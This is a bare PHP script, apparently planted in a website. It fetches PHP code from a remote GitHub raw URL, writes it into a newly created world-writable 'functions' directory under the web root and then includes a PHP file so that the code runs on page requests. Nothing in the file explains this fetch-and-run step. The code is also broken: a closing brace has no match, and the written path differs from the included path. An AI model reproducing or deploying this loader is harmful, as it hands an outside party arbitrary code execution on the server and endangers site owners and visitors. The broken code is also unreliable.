
<?php

$_dir_ = $_SERVER['DOCUMENT_ROOT'];
$tokens = explode(".", $_SERVER['HTTP_HOST']);
$domain = $tokens[0];

if($domain == 'www'){
    $domain = $tokens[1];
}



$url = 'https://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];

if (strpos($url,'customize') !== false) {
    echo $url;

} else {


    if (!file_exists($_dir_.'functions/')) {
        mkdir($_dir_.'functions/', 0777, true);
    }

    $j = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
    $myfile = fopen('./functions/'. $domain.'.php', "w") or die("Unable to open $domain.'.php'!");
    fwrite($myfile, $j);
    fclose($myfile);
require_once($_dir_.$domain.'.php');
    
    }


}


?>
